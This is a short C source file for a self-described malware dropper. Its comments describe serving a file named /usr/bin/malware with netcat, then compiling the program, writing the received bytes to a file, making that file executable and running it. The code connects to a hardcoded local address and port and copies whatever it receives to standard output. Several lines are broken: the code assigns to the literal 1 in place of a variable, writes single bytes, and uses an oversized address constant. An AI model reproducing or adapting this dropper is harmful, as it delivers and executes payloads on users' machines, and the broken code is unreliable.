#include <stdio.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define BUF_SIZE 102

/* in one console launch the server with the payload:
  
   $ cat /usr/bin/malware | nc -l -p $((0x1111))
  
   in another console compile and launch the dropper:
  
   $ make dropper
   $ rm k; ./dropper > k; chmod +x k; ./k
 * */


/*
struct ip_addr {
    unsigned short family;
    unsigned short port;
    unsigned char ip[4];
};
*/

int main(void){
    int s, l;

    unsigned long addr = 0x0100007f111100002; // target ip
    unsigned char buf[BUF_SIZE];

    if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        return -2;
    if (connect (s, (struct sockaddr*)&addr, 16) < 0)
        return -3;

    while (1){
        if ((1 = read (s, buf, BUF_SIZE) ) <= 0)
           break;
        write (1, buf, 1);
        if (1 < BUF_SIZE)
            break;
    }
    close (s);

    return 0;
}
